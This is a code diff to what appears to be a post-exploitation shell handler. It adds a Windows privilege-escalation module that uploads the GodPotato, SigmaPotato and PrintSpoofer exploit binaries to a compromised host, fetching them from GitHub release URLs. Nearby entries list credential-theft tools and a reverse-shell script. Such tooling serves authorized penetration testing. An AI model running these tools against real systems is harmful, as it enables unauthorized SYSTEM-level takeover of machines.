@@ -4511,6 +4511,27 @@ class upload_privesc_scripts(Module):
 			session.upload(URLS['privesccheck'])
 
 
+class potato(Module):
+    category = "Privilege Escalation"
+    def run(session, args):
+        """
+        Upload the latest version of {GodPotato, SigmaPotato, and PrintSpoofer}
+        """
+        if not session.write_access(session.cwd):
+            return
+
+        if session.OS == "Unix":
+            logger.error("This module runs only on Windows shells")
+        elif session.OS == "Windows":
+            session.upload(URLS['godpotato'])
+            session.upload(URLS['sigmapotato'])
+            if session.arch == "x64":
+                session.upload(URLS['printspoofer64'])
+            elif session.arch in ("x86", "i386", "i686"):
+                session.upload(URLS['printspoofer32'])
+
+
+
 class peass_ng(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
@@ -5661,6 +5682,10 @@ URLS = {
 	'sharpweb':		"https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe",
 	'ghostpack':		"https://codeload.github.com/r3motecontrol/Ghostpack-CompiledBinaries/zip/20a5f0a81456358b2bdc9846774949a7fb25acd8",
 	'conptyshell':		"https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1",
+	'godpotato':		"https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe",
+	'sigmapotato':		"https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe",
+	'printspoofer64':		"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
+	'printspoofer32':		"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
 }
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
